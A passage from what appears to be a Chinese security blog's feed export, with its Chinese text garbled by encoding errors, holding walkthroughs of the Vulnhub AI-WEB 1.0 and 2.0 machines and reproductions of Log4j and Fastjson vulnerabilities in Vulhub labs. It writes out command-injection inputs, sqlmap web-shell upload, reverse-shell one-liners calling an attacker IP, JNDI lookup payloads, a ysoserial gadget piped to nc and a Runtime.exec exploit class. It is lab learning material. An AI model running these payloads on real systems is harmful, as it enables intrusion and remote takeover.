alt="image-20230418231728302"></p><p>è¯´æ˜¯æŸ¥æ‰¾è¿™ä¸ªç›®å½•ä¸‹çš„ä¿¡æ¯ï¼Œäºæ˜¯è¿›è¡Œç›®å½•æ‰«æï¼Œæ²¡å‘ç°å•¥ï¼Œä½†æ˜¯å‘¢ï¼Œæ˜¯ä¸æ˜¯å¯ä»¥åˆ©ç”¨ç¬¬ä¸€ä¸ªå¯ä»¥å‘½ä»¤æ‰§è¡Œçš„ä½œç”¨æ¥è¿›è¡ŒæŸ¥æ‰¾å‘¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|find ../S0mextras/ . -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>è¿”å›ä¸Šä¸€ä¸ªç›®å½•è¿›è¡Œè¿™ä¸ªç›®å½•æ–‡ä»¶çš„æŸ¥æ‰¾ï¼Œäºæ˜¯å‘ç°äº†å…³é”®ä¿¡æ¯</p><p><img src="../images/image-20230418232009793.png" alt="image-20230418232009793"></p><p>cat è¿›è¡Œè¯»å–</p><p><strong>User: n0nr00tuser</strong><br><strong>Cred: zxowieoi4sdsadpEClDws1sf</strong></p><p>äºæ˜¯å°è¯•è¿›è¡Œsshç™»å½•</p><p><img src="../images/image-20230418232157543.png" alt="image-20230418232157543"></p><p>æˆåŠŸæ‹¿åˆ°æœåŠ¡å™¨çš„æƒé™ï¼Œåªä¸è¿‡æ˜¯ä½æƒé™</p><p>å°è¯•è¿›è¡Œææƒ</p><p>sudo -l ä¸è¡Œ å°è¯•suid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230420213253604.png" alt="image-20230420213253604"></p><p>å‡ºç°äº†ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ‘ä»¬å¾—è€ƒè™‘è®©ä»–æ¥è¿›è¡Œææƒ</p><p>äºæ˜¯å°±å…ˆæŸ¥çœ‹æŸ¥çœ‹å†…æ ¸ï¼Œçœ‹èƒ½ä¸èƒ½æ‰¾åˆ°æ¼æ´</p><p><img src="../images/image-20230420213426543.png" alt="image-20230420213426543"></p><p><img src="../images/image-20230420213435027.png" alt="image-20230420213435027"></p><p>äºæ˜¯è¿›è¡Œæ¼æ´åˆ©ç”¨ï¼Œçœ‹èƒ½ä¸èƒ½åˆ©ç”¨è¯¥äºŒè¿›åˆ¶æ–‡ä»¶é…åˆè¿™ä¸ªshæ–‡ä»¶è¿›è¡Œææƒ</p><p><img src="../images/image-20230420213549472.png" alt="image-20230420213549472"></p><p>æ‹¿åˆ°å®Œæ•´è·¯å¾„</p><p><img src="../images/image-20230420213646773.png" alt="image-20230420213646773"></p><p>è·Ÿç€é‡Œé¢çš„æ­¥éª¤ä¸€æ­¥ä¸€æ­¥æ¥å†™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/saghul/lxd-alpine-builder/</span><br></pre></td></tr></table></figure><p><strong>ä¸‹è½½å¥½äº†æ‹–åˆ°<code>kali</code>é‡Œé¢ ç„¶åè§£å‹ è¿è¡Œ<code>./build-alpine</code> ä¼šä¸‹è½½ä¸€ä¸ª<code>apk</code>çš„æ–‡ä»¶</strong></p><p><img src="../images/image-20230420214122839.png" alt="image-20230420214122839"></p><p>æ¥ä¸‹æ¥ç‚¹è¿è¡Œ<strong><code>build-alpine</code></strong></p><p>ç„¶åä¼šä¸‹è½½ä¸€ä¸ªapkæ–‡ä»¶</p><p><img src="../images/image-20230420214253688.png" alt="image-20230420214253688"></p><p>ç„¶åæŠŠä»–ä¼ åˆ°é¶æœºä¸Š</p><p><img src="../images/image-20230420214404838.png" alt="image-20230420214404838"></p><p>æˆåŠŸè¿›è¡Œä¼ é€</p><p><img src="../images/image-20230420214641055.png" alt="image-20230420214641055"></p><p>æŠŠå†…æ ¸ææƒç»™çš„expä¹Ÿä¼ è¿‡å»</p><p><img src="../images/image-20230420214722826.png" alt="image-20230420214722826"></p><p>äºæ˜¯å°è¯•è¿›è¡Œææƒ</p><p>å…ˆç»™ä»–ä¸¤ç»™ä¸€ä¸‹è¿è¡Œçš„æƒé™</p><p><img src="../images/image-20230420214853460.png" alt="image-20230420214853460"></p><p>æ¥ä¸‹æ¥ç›´æ¥è¿›è¡Œææƒæ“ä½œ</p><p><img src="../images/image-20230420215012652.png" alt="image-20230420215012652"></p><p>æŸ¥çœ‹ç”¨æ³•ï¼Œç„¶åç›´æ¥è¿›è¡Œææƒ</p><p><img src="../images/image-20230420215055452.png" alt="image-20230420215055452"></p><p>ç›´æ¥å°±æ˜¯rootæƒé™äº†</p><p><img src="../images/image-20230420215228022.png" alt="image-20230420215228022"></p><p>æ‰¾åˆ°flagä½ç½®</p><p><img src="../images/image-20230420215302055.png" alt="image-20230420215302055"></p><p>æ‹¿ä¸‹ï¼Œå°±æ˜¯å†…æ ¸ææƒ</p><p><strong>å’Œsuidæ‰¾å‡ºæ¥çš„äºŒè¿›åˆ¶æ–‡ä»¶æ²¡å•¥å…³ç³»</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub AI-WEB-2.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-AI-WEB-1.0</title>
      <link href="/posts/30c48027.html"/>
      <url>/posts/30c48027.html</url>
      
        <content type="html"><![CDATA[<p>å…ˆæ‰«ä¸€ä¸‹cæ®µ</p><p><img src="../images/image-20230417210846503.png" alt="image-20230417210846503"></p><p>å‘ç°ä¸»æœº</p><p>æ¥ä¸‹æ¥è¿›è¡Œç«¯å£æ‰«æ</p><p><img src="../images/image-20230417210949458.png" alt="image-20230417210949458"></p><p>å‘ç°åªæ‰«åˆ°äº†ä¸€ä¸ª80ç«¯å£</p><p>äºæ˜¯å°è¯•è¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230417211102655.png" alt="image-20230417211102655"></p><p>å°±å‡ºç°è¿™ä¸ªç©æ„</p><p>ç„¶åè¿›è¡Œç›®å½•æ‰«æ</p><p><img src="../images/image-20230417211628147.png" alt="image-20230417211628147"></p><p>å‘ç°å­˜åœ¨ä¸€ä¸ª<code>robots.txt</code>æ–‡ä»¶,äºæ˜¯è¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230417211745316.png" alt="image-20230417211745316"></p><p><strong>å‘ç°äº†ç½‘ç»œçˆ¬è™«åè®® <code>robots</code> è®¿é—®ä¸€ä¸‹ å‘ç°äº†ä¸¤ä¸ªç›®å½•<code>/m3diNf0/</code>å’Œ<code>/se3reTdir777/uploads/</code>ä¾æ¬¡è¿›è¡Œè®¿é—®ã€‚</strong></p><p><img src="../images/image-20230417211841895.png" alt="image-20230417211841895"></p><p><img src="../images/image-20230417211903531.png" alt="image-20230417211903531"></p><p>ä¸¤ä¸ªè®¿é—®å…¨æ˜¯è®¿é—®ä¸äº†ï¼Œäºæ˜¯å°è¯•æ¥ç€è¿›è¡Œç›®å½•æ‰«æ</p><p><img src="../images/image-20230417211950534.png" alt="image-20230417211950534"></p><p>ä¸¤ä¸ªç›®å½•åªæ‰«å‡ºä¸€ä¸ªç›®å½•èƒ½è¿›è¡Œè®¿é—®ï¼Œäºæ˜¯å°è¯•è¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230417212052641.png" alt="image-20230417212052641"></p><p>æ‰§è¡Œäº†phpinfo  ï¼Œé€šè¿‡è¿™ä¸ªæ¥æŸ¥çœ‹æœ‰æ²¡æœ‰å…³é”®ä¿¡æ¯</p><p><img src="../images/image-20230417212219650.png" alt="image-20230417212219650"></p><p>å‘ç°äº†ç½‘ç«™çš„ç»å¯¹è·¯å¾„è¿˜æœ‰å¦ä¸€ä¸ªè·¯å¾„<code>/se3reTdir777/uploads/</code> å‘ç°äº†ä¸€ä¸ª<code>index.php</code></p><p><img src="../images/image-20230417212408231.png" alt="image-20230417212408231"></p><p><img src="../images/image-20230417212520842.png" alt="image-20230417212520842"></p><p>è®¿é—®è¯¥ç½‘ç«™ï¼Œè§‰å¾—åƒæ˜¯å­˜åœ¨sqlæ³¨å…¥ï¼Œäºæ˜¯è¿›è¡Œsqlmapæµ‹è¯•</p><p><img src="../images/image-20230417212637629.png" alt="image-20230417212637629"></p><p>æŸ¥æ•°æ®åº“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.138/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --dbs #åˆ—å‡ºåº“</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417212759476.png" alt="image-20230417212759476"></p><p>æŸ¥å‡ºæ•°æ®åº“ï¼Œç„¶åè¿›è¡Œè¡¨çš„æŸ¥è¯¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.138/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  -D aiweb1 --tables #åˆ—å‡ºè¡¨</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417212859296.png" alt="image-20230417212859296"></p><p>æŸ¥å‡ºè¡¨ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¿›è¡Œåˆ—çš„æŸ¥è¯¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.138/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  -D aiweb1 -T user --columns #åˆ—å‡ºå­—æ®µ</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417212948686.png" alt="image-20230417212948686"></p><p>çœ‹èµ·æ¥æ²¡å•¥å¯åˆ©ç”¨çš„ä¿¡æ¯ï¼Œè€Œä¸”ç½‘ç«™é¡µæ²¡å•¥å¯ç”¨çš„ä¸œè¥¿ï¼Œäºæ˜¯è€ƒè™‘åˆ©ç”¨sqlmapè¿›è¡Œshellçš„åå¼¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.138/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --level=3 --os-shell </span><br></pre></td></tr></table></figure><p><strong>é€‰æ‹©<code>php(default)</code>ï¼Œ<code>custom location(s)</code> ç„¶åè¾“å…¥åˆšåˆšè·å–åˆ°çš„è·¯å¾„ï¼š<code>/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</code></strong></p><p><strong>è·å–åˆ°<code>shell</code> ä½†æ˜¯æƒé™æ¯”è¾ƒä½æ˜¯<code>www-data</code></strong></p><p><img src="../images/image-20230417214433781.png" alt="image-20230417214433781"></p><p><img src="../images/image-20230417214422725.png" alt="image-20230417214422725"></p><p>è¿™é‡Œçš„è”ç³»çœŸçš„å¾ˆå¯†åˆ‡ï¼Œå°±æ˜¯ç»™çš„ä¸œè¥¿æ˜¯ä¸€å®šä¼šç”¨åˆ°çš„</p><p>è¿™é‡Œç”±äºæ˜¯ä¸Šä¼ æ–‡ä»¶ç›®å½•ï¼Œäºæ˜¯æˆ‘ä»¬å†™ä¸€å¥è¯æœ¨é©¬è¿›å»ï¼Œç„¶åå°è¯•èšå‰‘è¿æ¥</p><p><img src="../images/image-20230417214918819.png" alt="image-20230417214918819"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.138/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --file-write ./hack.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/hack.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417215049771.png" alt="image-20230417215049771"></p><p><strong>æ¥ç€è®¿é—®<code>http://192.168.142.138/se3reTdir777/uploads/hack.php</code> å¦‚æœæ˜¯ç©ºç™½çš„è¯´æ˜ä¸Šä¼ çš„æœ¨é©¬æˆåŠŸäº†ï¼ï¼ ç›´æ¥ä¸Š<code>WebSell</code>å·¥å…· èšå‰‘è¿æ¥</strong></p><p><img src="../images/image-20230417215216558.png" alt="image-20230417215216558"></p><p>ä¸Šä¼ æˆåŠŸï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°è¯•è¿›è¡Œææƒ</p><p>ä½¿ç”¨èšå‰‘è¿›è¡Œshellçš„åå¼¹æ“ä½œ</p><ol><li><strong>ç°åœ¨kaliä¸Šé¢ç›‘å¬ä¸€ä¸‹ç«¯å£ä½¿ç”¨å‘½ä»¤ï¼š nc -lvvp 6666</strong></li><li><strong>nc -e /bin/bash 192.168.0.103 6666ï¼ˆå‘ç°-eå‚æ•°ä¸å¯ç”¨ï¼‰</strong></li><li><strong>ä½¿ç”¨å‘½ä»¤ï¼šrm /tmp/f;mkfifo/tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.142.129 6666 &gt;/tmp/fï¼ˆå›å¼¹äº†shellï¼‰</strong></li><li><strong>ä½¿ç”¨å‘½ä»¤ï¼špython -c â€œimport pty;pty.spawn(â€˜/bin/bashâ€™)â€ï¼ˆpythonå†™äº¤äº’ï¼‰</strong></li></ol><p>æœ‰äº›æ—¶å€™å°±æ˜¯ä¸æ”¯æŒ  -e shellçš„åå¼¹ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯rmåå¼¹</p><p><img src="../images/image-20230417215609447.png" alt="image-20230417215609447"></p><p>æˆåŠŸè¿›è¡Œäº†shellçš„åå¼¹</p><p><strong>äºæ˜¯æ¥ä¸‹æ¥å°±è¿›è¡Œææƒçš„æ“ä½œäº†</strong></p><p>å› ä¸ºè¿™é‡Œåå¼¹shellä¹‹åæ²¡åŠ¨é™äº†ï¼Œäºæ˜¯å°±ä¸å†™äº†ï¼Œææƒçš„è¯å’ŒDC-9çš„æ–¹æ³•æ˜¯ä¸€æ ·çš„ï¼Œç»™/etc/passwdåé¢æ·»åŠ ä¸€æ¡</p><p>ç„¶ååˆ‡æ¢ idå°±æ˜¯rootæƒé™äº†</p><p><a href="https://blog.csdn.net/Aluxian_/article/details/124434294">å‰©ä¸‹çš„ææƒæ“ä½œ</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub AI-WEB-1.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulhub-log4jæ¼æ´å¤ç°</title>
      <link href="/posts/cca4fef7.html"/>
      <url>/posts/cca4fef7.html</url>
      
        <content type="html"><![CDATA[<h2 id="CVE-2021-44228-Apache-Log4j-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#CVE-2021-44228-Apache-Log4j-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="CVE-2021-44228 Apache Log4j è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>CVE-2021-44228 Apache Log4j è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h2><h4 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a><strong>æ¼æ´æè¿°</strong></h4><p>Apache Log4j 2 æ˜¯Javaè¯­è¨€çš„æ—¥å¿—å¤„ç†å¥—ä»¶ï¼Œä½¿ç”¨æä¸ºå¹¿æ³›ã€‚åœ¨å…¶2.0åˆ°2.14.1ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€å¤„JNDIæ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…åœ¨å¯ä»¥æ§åˆ¶æ—¥å¿—å†…å®¹çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ä¼ å…¥ç±»ä¼¼äº${jndi:ldap://evil.com/example}çš„lookupç”¨äºè¿›è¡ŒJNDIæ³¨å…¥ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p>å‚è€ƒåœ°å€ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">https</span>:<span class="comment">//github.com/vulhub/vulhub</span></span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p>æœ¬æ¬¡æ¼æ´å¤ç°ä¹Ÿæ˜¯åŸºäºVulhub</p><h4 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d --build</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417174622063.png" alt="image-20230417174622063"></p><p>è®¿é—®<code>http://127.0.0.1:8983/solr/#/</code></p><p><img src="../images/image-20230417174936629.png" alt="image-20230417174936629"></p><p><strong>è¿›è¡Œdnsæµ‹è¯•çœ‹æ˜¯å¦å­˜åœ¨æ¼æ´</strong></p><p>å…ˆæ‹¿ä¸€ä¸ªåŸŸå</p><p><img src="../images/image-20230417175046593.png" alt="image-20230417175046593"></p><p><strong>æ„é€ </strong></p><p><code>$&#123;jndi:dns://$&#123;sys:java.version&#125;.example.com&#125;</code>æ˜¯åˆ©ç”¨JNDIå‘é€DNSè¯·æ±‚çš„Payloadï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.sij1vb.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥è®¿é—®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.3j7r1s.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417175341507.png" alt="image-20230417175341507"></p><p>å¾—åˆ°javaçš„ç‰ˆæœ¬æ˜¯1.8</p><p><strong>é‚£ä¹ˆè¿™ä¹Ÿè¯´æ˜äº†æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„</strong></p><p>äºæ˜¯è¿›è¡Œåå¼¹shell</p><p><strong>åå¼¹shell</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/vps_ip/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå½¢æ€</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMjkvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>åå¼¹shelléœ€è¦çš„å·¥å…·</p><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">å·¥å…·åœ°å€ï¼Œä¸‹é¢æ˜¯æ“ä½œæµç¨‹</a></p><p><img src="../images/image-20230417194052114.png" alt="image-20230417194052114"></p><p><img src="../images/image-20230417194154023.png" alt="image-20230417194154023"></p><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMjkvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; -A <span class="string">&quot;192.168.142.129&quot;</span></span><br></pre></td></tr></table></figure><p>-Cæ˜¯ç¼–ç åçš„å†…å®¹ï¼Œ-Aæ˜¯åå¼¹shellçš„ipåœ°å€ã€‚<br>æ³¨æ„è¦å…ˆncç›‘å¬6666ç«¯å£.</p><p><img src="../images/image-20230417195106656.png" alt="image-20230417195106656"></p><p>å› ä¸ºæŸ¥å‡ºæ¥çš„javaç‰ˆæœ¬æ˜¯1.8</p><p>ç„¶åè¿›è¡ŒæŠ“åŒ…å‘åŒ…</p><p><img src="../images/image-20230417200034238.png" alt="image-20230417200034238"></p><p>æŠŠç”Ÿæˆçš„payloadæ‹¿å»æ‰“</p><p>ç„¶åå°±æˆåŠŸå°†shellåå¼¹</p><p><img src="../images/image-20230417200109588.png" alt="image-20230417200109588"></p><p><img src="../images/image-20230417200310374.png" alt="image-20230417200310374"></p><h2 id="vulhub-log4jæ¼æ´å¤ç°-CVE-2017-5645"><a href="#vulhub-log4jæ¼æ´å¤ç°-CVE-2017-5645" class="headerlink" title="vulhub-log4jæ¼æ´å¤ç°(CVE-2017-5645)"></a>vulhub-log4jæ¼æ´å¤ç°(<a href="https://so.csdn.net/so/search?q=CVE&amp;spm=1001.2101.3001.7020">CVE</a>-2017-5645)</h2><h4 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a><strong>æ¼æ´å¤ç°</strong></h4><p>è¿˜æ˜¯å…ˆåˆ©ç”¨dockeræ­å»ºç¯å¢ƒ</p><p><img src="../images/image-20230417203312678.png" alt="image-20230417203312678"></p><p>æ­å»ºå®Œæ¯•</p><p>å‡†å¤‡å·¥å…·ï¼Œè¿™é‡Œç”¨çš„æ˜¯   <a href="https://github.com/frohoff/ysoserial">ysoserial</a></p><p>ç„¶åcdè¿›å…¥è¯¥ç›®å½•ï¼Œä½¿ç”¨<code>mvn clean package -DskipTests</code>å‘½ä»¤ç”ŸæˆjaråŒ…</p><p><strong>è¿™é‡Œè¯javaç‰ˆæœ¬æ¢æˆjava1.8_20 </strong>  å’Œfastjsoné‚£ä¸ªæ–¹æ³•ä¸€æ ·æ¥è®¾ç½®javaç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java â€jar ysoserial-v0<span class="number">.0</span><span class="number">.6</span>-all.jar CommonsCollections5 <span class="string">&quot;touch /tmp/success&quot;</span> | nc <span class="number">192.168</span><span class="number">.217</span><span class="number">.134</span> <span class="number">4712</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯å¾€/tmpå‘½ä»¤é‡Œå†™å…¥successæ–‡ä»¶ï¼Œ</p><p><a href="https://blog.csdn.net/qq_51295677/article/details/125703978">å¤ç°æ–‡ç« ï¼Œæ¥ä¸‹æ¥æˆ‘å°±ä¸å†™äº†</a></p><p>å› ä¸ºä¸çŸ¥é“å“ªä¸ªipå¼€å¯äº†4712ç«¯å£</p>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub log4j æ¼æ´å¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulhub-fastjsonæ¼æ´å¤ç°</title>
      <link href="/posts/5a844f8c.html"/>
      <url>/posts/5a844f8c.html</url>
      
        <content type="html"><![CDATA[<p><img src="../images/image-20230417145033021.png" alt="image-20230417145033021"></p><p>å…ˆäº†è§£ä¸€ä¸‹ç€å‡ ä¸ªç­‰ä¼šå¤ç°éœ€è¦ç”¨åˆ°çš„ä¸œè¥¿</p><p><a href="https://cloud.tencent.com/developer/article/1974944">å¹²è´§ï½œæœ€å…¨fastjsonæ¼æ´å¤ç°ä¸ç»•è¿‡</a></p><h2 id="CVE-2017-18349å³Fastjson1-2-24-ååºåˆ—åŒ–æ¼æ´RCE"><a href="#CVE-2017-18349å³Fastjson1-2-24-ååºåˆ—åŒ–æ¼æ´RCE" class="headerlink" title="CVE-2017-18349å³Fastjson1.2.24 ååºåˆ—åŒ–æ¼æ´RCE"></a>CVE-2017-18349å³Fastjson1.2.24 ååºåˆ—åŒ–æ¼æ´RCE</h2><p><strong>ubuntu:  é¶æœº </strong>   <strong>192.168.142.137</strong></p><p><strong>kali: æ”»å‡»æœº</strong>   <strong>192.168.142.129</strong></p><h4 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a><strong>æ¼æ´åŸç†</strong></h4><p>fastjsonåœ¨è§£æjsonå¯¹è±¡æ—¶ï¼Œä¼šä½¿ç”¨autoTypeå®ä¾‹åŒ–æŸä¸€ä¸ªå…·ä½“çš„ç±»ï¼Œå¹¶è°ƒç”¨set/getæ–¹æ³•è®¿é—®å±æ€§ã€‚æ¼æ´å‡ºç°åœ¨Fastjson autoTypeå¤„ç†jsonå¯¹è±¡æ—¶ï¼Œæ²¡æœ‰å¯¹@typeå­—æ®µè¿›è¡Œå®Œæ•´çš„å®‰å…¨æ€§éªŒè¯ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥å±é™©çš„ç±»å¹¶è°ƒç”¨å±é™©ç±»è¿æ¥è¿œç¨‹RMIæœåŠ¡å™¨ï¼Œé€šè¿‡æ¶æ„ç±»æ‰§è¡Œæ¶æ„ä»£ç ï¼Œè¿›è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p><p>å½±å“ç‰ˆæœ¬ä¸º fastjson &lt; 1.2.25</p><h4 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h4><p>é¦–å…ˆè¿›å…¥fastjson 1.2.24çš„dockerç¯å¢ƒï¼Œä½¿ç”¨<code>java -version</code>æŸ¥çœ‹ä¸€ä¸‹javaçš„ç‰ˆæœ¬ä¸º1.8.0_102ã€‚å› ä¸ºjavaç¯å¢ƒä¸º102ï¼Œæ²¡æœ‰<code>com.sun.jndi.rmi.object.trustURLCodebase</code>çš„é™åˆ¶ï¼Œå¯ä»¥ä½¿ç”¨<code>com.sun.rowset.JdbcRowSetImpl</code>åˆ©ç”¨é“¾ç»“åˆJNDIæ³¨å…¥æ‰§è¡Œè¿œç¨‹å‘½ä»¤</p><p><strong>å®‰è£…javacç¯å¢ƒï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨20ç‰ˆæœ¬æ›¿æ¢102</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">curl http:<span class="comment">//www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz</span></span><br><span class="line">tar zxvf jdk-8u20-linux-x64.tar.gz</span><br><span class="line">rm -rf /usr/bin/java*</span><br><span class="line">ln -s /opt/jdk1<span class="number">.8</span><span class="number">.0_20</span>/bin/j* /usr/bin</span><br><span class="line">javac -version</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417145253381.png" alt="image-20230417145253381"></p><p> æ”»å‡»æœºçš„javaç‰ˆæœ¬å¿…é¡»æ˜¯<strong>java8</strong></p><p><strong>æ‰“å¼€dockeré¶æœº</strong></p><p><img src="../images/image-20230417151012246.png" alt="image-20230417151012246"></p><p>ç¼–è¾‘æ¶æ„ç±»ä»£ç ï¼Œèµ·åä¸ºevilclass.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilclass</span>&#123;</span><br><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/test&quot;</span>&#125;;</span><br><span class="line"><span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">pc.waitFor();</span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line"><span class="comment">// do nothing</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>String[] commands</code>å¯ä»¥è¿›è¡Œä¿®æ”¹è‡ªå·±æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚è¿™é‡Œæ˜¯åœ¨<code>/tmp</code>ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª<code>test</code>æ–‡ä»¶</p><p><strong>ä½¿ç”¨javacç¼–è¯‘evilclass.javaæ–‡ä»¶ç”Ÿæˆevilclass.class</strong></p><p><img src="../images/image-20230417152951359.png" alt="image-20230417152951359"></p><p>è¿™é‡Œçš„åŒ–æƒ³è¦æ­å»ºä¸€ä¸ªRMIæœåŠ¡ï¼Œé¦–å…ˆä¸‹è½½marshalsec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 